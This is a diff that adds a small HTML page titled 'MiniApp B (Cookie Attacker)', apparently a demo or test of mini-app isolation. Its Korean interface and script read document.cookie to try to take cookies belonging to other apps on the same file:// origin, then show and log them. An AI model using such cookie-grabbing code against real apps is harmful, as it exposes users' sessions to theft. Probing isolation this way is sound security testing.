@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>MiniApp B</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background-color: #fce4ec; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #e91e63; color: white; border: none; border-radius: 5px; }
+        .stolen { margin-top: 20px; padding: 10px; border: 2px solid red; background: white; color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>MiniApp B (Cookie Attacker)</h1>
+    <p>이 앱은 다른 미니앱의 쿠키를 탈취하려고 시도합니다.</p>
+    <button onclick="stealCookie()">다른 앱 쿠키 탈취하기</button>
+    <div class="stolen" id="result">결과: 아직 탈취 전</div>
+
+    <script>
+        function stealCookie() {
+            // document.cookie를 통해 동일 출처(file://)의 다른 앱 쿠키 접근 시도
+            const cookies = document.cookie;
+            if (cookies) {
+                document.getElementById('result').innerText = "탈취 성공! 발견된 쿠키: " + cookies;
+                console.log("Stolen Cookies in App B: " + cookies);
+            } else {
+                document.getElementById('result').innerText = "탈취 실패: 쿠키가 없습니다.";
+            }
+        }
+    </script>
+</body>
+</html>
